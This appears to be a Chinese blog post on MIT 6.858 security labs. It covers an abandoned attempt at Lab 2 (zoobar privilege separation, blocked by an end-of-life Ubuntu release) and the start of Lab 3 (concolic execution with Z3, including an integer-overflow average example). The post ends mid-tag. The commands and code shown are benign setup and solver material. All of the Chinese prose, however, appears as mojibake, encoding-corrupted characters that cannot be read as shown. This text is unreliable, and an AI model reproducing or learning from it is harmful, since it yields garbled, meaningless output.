<strong>æœåŠ¡å™¨ä¾§æ²™ç®±</strong>ï¼ˆserver-side sandboxingï¼‰ï¼Œè¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸»è¦é€šè¿‡ä¸€ä¸ª MIT ç¼–å†™çš„åä¸º <code>zoobar</code> çš„ python web åº”ç”¨æ¥å®Œæˆï¼Œå…¶ä¸­æƒé™éš”ç¦»çš„ç›®çš„æ˜¯ä¿è¯æ”»å‡»è€…åœ¨ç ´åç¨‹åºçš„ä¸€éƒ¨åˆ†æ—¶ä¸ä¼šç ´ååˆ°ç¨‹åºçš„å¦ä¸€éƒ¨åˆ†ï¼Œè¯¥ lab å°†ä½¿ç”¨ <a href="https://linuxcontainers.org/">Linux containers</a> æ¥å®Œæˆ</p><blockquote><p>æ­¤å‰çš„ lab ä¸­ä½¿ç”¨çš„æ˜¯åœ¨è¯¾ä¸Šè®²è¿‡çš„ OKWS web serverï¼ˆ<del>ğŸ‘´æ²¡å¬è¯¾ï¼Œå¯„äº†</del>ï¼‰</p></blockquote><p>æœ¬ lab ä¸­æˆ‘ä»¬å°†å®Œæˆä¸€ä¸ªæƒé™éš”ç¦»çš„ web serverï¼Œæ£€æŸ¥çœ‹ä½ çš„æ¼æ´ï¼Œå¹¶å°†ç¨‹åºä»£ç åˆ†å‰²æˆéœ€è¦æ›´å°‘æƒé™çš„å†…å®¹å¿«ä»¥æœ€å°åŒ–å•ä¸ªæ¼æ´çš„å½±å“ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å°†æ‰©å±• Zoobar ä»¥ä½¿å…¶æ”¯æŒ  <em>å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</em>  ï¼ˆexecutable profilesï¼‰ï¼Œè¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨ python æ¥ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå¹¶å®Œæˆä¸åŒç”¨æˆ·é…ç½®æ–‡ä»¶çš„éš”ç¦»ï¼Œè¿™å…è®¸ç”¨æˆ·åœ¨å…¶é…ç½®æ–‡ä»¶ä¸­å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä¸€ä¸ªæŒ‰ç”¨æˆ·åæ¬¢è¿è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªè®°å½•æœ€åå‡ ä½è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªä¸ºæ¯ä½è®¿å®¢æä¾› zoobar çš„ profileï¼ˆé™åˆ¶ä¸ºæ¯åˆ†é’Ÿ1ä½ï¼‰</li></ul><p>è¿™éœ€è¦æ²™ç®±åŒ–æœåŠ¡å™¨ä¸Šçš„ profile code ä»è€Œé¿å…ä»»æ„ä»£ç æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶è®¿é—®ï¼Œæ­¤å¤–ï¼Œè¿™äº›ä»£ç æˆ–è®¸éœ€è¦ä¿æŒè®°å½•ä¸€äº›æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæˆ–æ˜¯è®¿é—® zoobar æ•°æ®åº“ä»¥æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åä¸ºåº“çš„è¿œç¨‹è¿‡ç¨‹ä¸ lab æä¾›çš„ä¸€äº›ä»£ç æ¥æ²™ç®±åŒ–å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</p><blockquote><p>å®éªŒæ‰‹å†ŒåŸæ–‡å°±æŒºä¹±ä¸ƒå…«ç³Ÿçš„ï¼ŒğŸ‘´æ„£æ˜¯æ²¡å’‹çœ‹æ˜ç™½ï¼Œ<del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´çš„è‹±æ–‡æ°´å¹³å¤ªåƒåœ¾äº†</del></p></blockquote><p>é‚£ä¹ˆæ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æŠŠä»£ç åˆ‡åˆ° lab2 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯å…ˆ <code>make</code> æ£€æŸ¥ä¸€ä¸‹ï¼Œæ²¡æŠ¥é”™å°± ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-Whatâ€™s-a-zoobar"><a href="#Prelude-Whatâ€™s-a-zoobar" class="headerlink" title="Prelude: Whatâ€™s a zoobar?"></a>Prelude: Whatâ€™s a zoobar?</h2><p>ä¸ºäº†ç†è§£ <code>zoobar</code>ï¼Œæˆ‘ä»¬é¦–å…ˆè¿‡ä¸€ä¸‹éƒ¨åˆ†æºç </p><p><code>zoobar</code> çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§æ˜¯å…è®¸åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’å‡­è¯ï¼ˆcreditsï¼‰ï¼Œè¿™ç”± <code>transfer.py</code> å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥å¯åŠ¨ zoobar æ„Ÿå—ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>è¿™ç©æ„éœ€è¦ python çš„ <code>lxc</code> æ¨¡å—æ‰èƒ½è·‘ï¼Œä½†æ˜¯ç¬”è€…æ€ä¹ˆéƒ½å®‰ä¸ä¸Šâ€¦<del>lab2 å°±æ­¤å®Œç»“</del> </p><p>ç¬”è€…æœ€ç»ˆé€‰æ‹©  <em>æ”¾å¼ƒä½¿ç”¨è‡ªå·±æ­å»ºçš„å®éªŒç¯å¢ƒ</em>  ï¼Œé‡æ–°ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒç¯å¢ƒå»åšå®éªŒï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ <code>./zookld.py</code> æ—¶åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼š</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜çš„å‡ºç°æ˜¯å› ä¸º <strong>Ubuntu 21.10 å·²ç»åœæ­¢æ›´æ–°</strong>ï¼Œæˆ‘ä»¬æ¥çœ‹ <code>zookld.py</code> çš„é€»è¾‘ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç›´æ¥è°ƒç”¨ <code>zookconf.py</code> é‡Œçš„ <code>boot()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure><p>é‡Œé¢å­˜åœ¨è¿™æ ·ä¸€ä¸ªè°ƒç”¨é“¾ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>configure_base()</code> ä¸­æœ‰ç€ä¸€ä¸ªè°ƒç”¨ <code>apt-get</code> çš„é€»è¾‘ï¼Œç”±äº <strong>Ubuntu 21.10 å·²ç» <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> äº†ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥æ˜¯å¿…ç„¶ä¼šå¤±è´¥çš„</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>å‚è§ <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> ä¸ <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><del>ğŸ‘´çœŸçš„éº»äº†ï¼Œè¿™å®éªŒâ„¢æ˜¯ MIT ä»Šå¹´æ˜¥å­£å­¦æœŸå‘å¸ƒçš„ï¼Œç”¨ä¸ª 20.04 è¿™æ ·çš„ LTS ä¸å¥½ğŸï¼Œç”¨ä¸ªå°±åªå‰©å‡ ä¸ªğŸˆ·å¯¿å‘½çš„ 21.10 å°±ç¦»è°±</del></p></blockquote></blockquote><p>MIT ä¼°è®¡æ˜¯ä¸ä¼šä¿®è¿™ä¸ªé—®é¢˜äº†ï¼Œè€Œä¸‹ä¸€æ¬¡çš„å®éªŒæ‰‹å†Œå¾—ç­‰åˆ° 2023 å¹´çš„æ˜¥å­£å­¦æœŸæ‰èƒ½ä¸Šçº¿ï¼Œé‚£è¿™é‡Œç¬”è€…åªèƒ½è‡ªè¡Œå°è¯•è§£å†³è¿™ä¸ªé—®é¢˜äº†: (</p><p>è¿™é‡Œç¬”è€…è¯•äº†å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡èƒ½æˆåŠŸå°† Ubuntu 21.10 å‡çº§æˆ 22.04 æˆ–æ˜¯å…¶ä»–çš„å¯ç”¨ç‰ˆæœ¬ï¼Œæœ€åç¬”è€…å°† <code>apt-get</code> æ›¿æ¢æˆ <code>apt</code> ä¹‹åå€’æ˜¯èƒ½è·‘äº†ï¼Œä¸è¿‡<strong>æ— æ³•æ­£å¸¸è®¿é—® zoobar æœåŠ¡å™¨</strong>ï¼Œä¼šæŠ¥ä¸€ä¸ª module not found ä½†æ˜¯å®é™…ä¸Šå·²ç»å®‰è£…æœ‰å¯¹åº”æ¨¡å—çš„é”™è¯¯ : (</p><blockquote><p>è¿™é‡Œå…ˆğŸ•Šäº†ï¼Œè¦æ˜¯ä¹‹åèƒ½é‡æ–°åšä¸Šå†è¡¥ï¼Œè¿˜å¥½å‡ ä¸ª lab ä¹‹é—´å¹¶éä¾èµ–å…³ç³»å¯ä»¥è®©ç¬”è€…å…ˆå¾€åç»§ç»­åš lab3 : )</p></blockquote><h1 id="0x03-Lab-3-Symbolic-execution"><a href="#0x03-Lab-3-Symbolic-execution" class="headerlink" title="0x03.Lab 3: Symbolic execution"></a>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ lab å°†æ•™å¤§å®¶ä½¿ç”¨ <strong>ç¬¦å·æ‰§è¡Œ</strong> ï¼ˆ<strong>symbolic execution</strong>ï¼‰ è¿™ä¸€å¼ºå¤§çš„æŠ€æœ¯æ¥å¯»æ‰¾è½¯ä»¶ä¸­çš„æ¼æ´ï¼Œåœ¨ lab çš„æœ€åæˆ‘ä»¬å°†å»ºç«‹ä¸€ä¸ªå¯ä»¥åœ¨ zoobar web åº”ç”¨ä¸­å¯»æ‰¾è§¦å‘å¤šç§æ¼æ´çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼ˆå‡†ç¡®çš„è¯´æ˜¯ä¸€ä¸ª<strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆconcolic executionï¼‰ç³»ç»Ÿï¼‰</p><blockquote><p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>åœ¨ <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> ä¸­æè¿°äº†ä¸€ä¸ªç”¨äº C ç¨‹åºçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œä¸ºäº†ç®€å•åŒ–ï¼Œè¯¥ lab å°†é€šè¿‡ä¿®æ”¹ Python å¯¹è±¡ä¸é‡è½½ç‰¹å®šæ–¹æ³•æ¥ä¸º Python ç¨‹åºå»ºç«‹ä¸€ä¸ªç¬¦å·&#x2F;æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œç±»ä¼¼äº EXEï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª SMT ï¼ˆ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>ï¼Œå¯æ»¡è¶³æ€§æ¨¡ç†è®ºï¼‰æ±‚è§£å™¨æ¥æ£€æŸ¥å¯æ»¡è¶³çš„çº¦æŸï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ±‚è§£å™¨å¯ä»¥æ£€æŸ¥åŒæ—¶åŒ…å«ä¼ ç»Ÿå¸ƒå°”å¯æ»¡è¶³æ€§è¡¨è¾¾å¼ä¸æ¶‰åŠå…¶ä»–â€œç†è®ºâ€çš„çº¦æŸå¦‚æ•´å‹ã€ä½å‘é‡ã€å­—ç¬¦ä¸²ç­‰</p><p>æœ¬ lab åˆå§‹æˆ‘ä»¬é¦–å…ˆè¦é€šè¿‡è®¡ç®— 32 ä½æœ‰&#x2F;æ— ç¬¦å·æ•°çš„å¹³å‡å€¼æ¥ç†Ÿæ‚‰ <strong>Z3</strong>â€”â€”ä¸€ä¸ªæµè¡Œçš„ SMT æ±‚è§£å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¸º Python æ•´å‹æ“ä½œåˆ›å»º wrappersï¼ˆç±»ä¼¼ EXE æä¾›äº†ç¬¦å·å˜é‡ä¸Šçš„æ“ä½œç½®æ¢ï¼‰ï¼Œå¹¶åº”ç”¨è°ƒç”¨ Z3 çš„æ ¸å¿ƒé€»è¾‘æ¥æ¢ç´¢å¯èƒ½çš„ä¸åŒæ‰§è¡Œè·¯å¾„ï¼›æœ€ç»ˆæˆ‘ä»¬å°†æ¢ç´¢å¦‚ä½•å°†å…¶åº”ç”¨åœ¨ web åº”ç”¨ç¨‹åºä¸Šï¼Œä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å°†ä¸º Python çš„å­—ç¬¦ä¸²æ“ä½œå¥—ä¸€å±‚ wrapperï¼Œåœ¨ SQLalchemy æ•°æ®åº“æ¥å£ä¸Šåº”ç”¨å¯¹ç¬¦å·åŒ–å‹å¥½çš„ï¼ˆsymbolic-friendlyï¼‰wrapperï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿå¯»æ‰¾ Zoobar ä¸­çš„æ¼æ´</p><blockquote><p>ä¸Šé¢ä¸¤æ®µéƒ½æ˜¯æŠ„å®éªŒæ‰‹å†Œçš„</p></blockquote><p>æ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°åˆ‡æ¢åˆ° lab 3 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ä¸è¦å°† lab 2 çš„ä»£ç åˆå¹¶åˆ° lab 3 é‡Œè¾¹ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ— æ³•é€šè¿‡ RPC è¿½è¸ªå¤šè¿›ç¨‹é—´çš„ç¬¦å·çº¦æŸï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€ä¸ªæ²¡æœ‰è¿›è¡Œæƒé™åˆ†ç¦»çš„ Zoobar ä¸Šè¿›è¡Œç¬¦å·æ‰§è¡Œ</p><p>æ¥ä¸‹æ¥æ˜¯æ£€æŸ¥ä»£ç å¯ç”¨æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹å°±ğŸ†—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯ CPU å¯†é›†å‹çš„ï¼Œå› æ­¤å¯¹äºä¸å¼€å¯ KVM æ”¯æŒçš„ QEMU è€Œè¨€ä¼šéå¸¸æ…¢ï¼š</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">ã€</p><h2 id="Using-an-SMT-solver"><a href="#Using-an-SMT-solver" class="headerlink" title="Using an SMT solver"></a>Using an SMT solver</h2><p>ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ˜¯ <strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆ<strong>Satisfiability Modulo Theory solver</strong>ï¼Œ å³ <code>SMT solver</code>ï¼‰ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä½¿ç”¨å¾®è½¯å¼€å‘çš„ <a href="https://github.com/Z3Prover/z3">Z3 solver</a> çš„ Python-based APIï¼ˆå‚è§ <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3â€™s Python API</a>ï¼‰ï¼Œå¹¶ä½¿ç”¨  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3â€™s support for strings</a>ï¼›æœ¬ Lab å¸¦æœ‰ä¸€ä¸ªæ„å»ºè‡ª <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> çš„ Z3</p><p>å®éªŒæä¾›äº† <code>int-avg.py</code> ä½œä¸ºä½¿ç”¨ Z3 çš„ä¾‹å­ï¼š  <em>è®¡ç®—ä¸¤ä¸ª 32 ä½æ•´å‹çš„å¹³å‡å€¼</em>  ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ç®—æ³•æ˜¯ <code>(x + y) / 2</code> ï¼Œä½†è¿™å¯èƒ½ä¼šå‘ç”Ÿ<strong>æ•´å‹ä¸Šæº¢</strong>ï¼Œä»è€Œå¾—åˆ°  <em>æ¨¡ 2<sup>32</sup></em> ä¸Šçš„å€¼ï¼ˆæƒ³äº†è§£æ›´å¤šï¼Œå‚è§  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ï¼‰â€”â€”Z3 å¯ä»¥å¸®æˆ‘ä»¬æ£€æŸ¥è¿™ä¸ªé”™è¯¯ï¼šäºˆå…¶ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼ŒZ3 å¯ä»¥å‘Šè¯‰æˆ‘ä»¬å…¶<strong>æ˜¯å¦ä¸ºçœŸ</strong>ï¼ˆå³å¯ä»¥è¢«æ»¡è¶³ï¼‰ï¼›è‹¥è¡¨è¾¾å¼å¯ä»¥ä¸ºçœŸä¸”åŒ…å«ä¸€äº›å˜é‡ï¼ŒZ3 å¯ä»¥ç»™æˆ‘ä»¬ä¸€äº›ä½¿è¡¨è¾¾å¼ä¸ºçœŸçš„ğŸŒ°å˜é‡</p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™ä»½ä»£ç ï¼ˆè¿™é‡Œä¸ä¼šä»”ç»†è®² Z3 çš„ç”¨æ³•ï¼Œä¸æ‡‚çš„ <a href="https://z3prover.github.io/api/html/">è‡ªè¡ŒæŸ¥æ–‡æ¡£</a>ï¼‰ï¼Œå…¶é¦–å…ˆä¼šä½¿ç”¨ Z3 åˆ›å»ºä¸¤ä¸ª 32 ä½çš„ä½å‘é‡ a ä¸ bï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†åˆ«è®¡ç®—æœ‰&#x2F;æ— ç¬¦å·é™¤æ³•ä¸‹ä¸¤æ•°çš„å¹³å‡å€¼ï¼Œæ³¨æ„è¿™é‡Œ<strong>å¹¶æ²¡æœ‰å®é™…è¿›è¡Œè®¡ç®—ï¼Œè€Œä»…æ˜¯ä¿å­˜äº†ç¬¦å·å˜é‡è¡¨è¾¾å¼</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç”±äº 32 ä½æ•´æ•°åŠ æ³•å¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œæ•…è¿™é‡Œä¸ºäº†æ±‚å¾—å…¶æ­£ç¡®çš„å¹³å‡å€¼ï¼Œæˆ‘ä»¬å°†å…¶æ‰©å±•ä¸ºä¸¤ä¸ª 33 ä½çš„ä½å‘é‡ï¼Œå®Œæˆè®¡ç®—åå†æˆªæ–­å› 32 ä½ï¼ˆä¸ä¼šå¯¼è‡´ç»“æœé”™è¯¯ï¼Œå› ä¸º 32 ä½çš„å¹³å‡å€¼æ€»ä¼šåœ¨ 32 ä½å†…ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ±‚è§£æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿå‘ç”Ÿæ•´å‹æº¢å‡ºçš„çº¦æŸï¼Œå³ï¼šæ˜¯å¦å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ª 32 ä½æ•´å‹å˜é‡å€¼ä½¿å¾—å…¶ 32 ä½ä¸‹è¿ç®—ç»“æœä¸ä¸çœŸå®è®¡ç®—ç»“æœç›¸ç­‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td 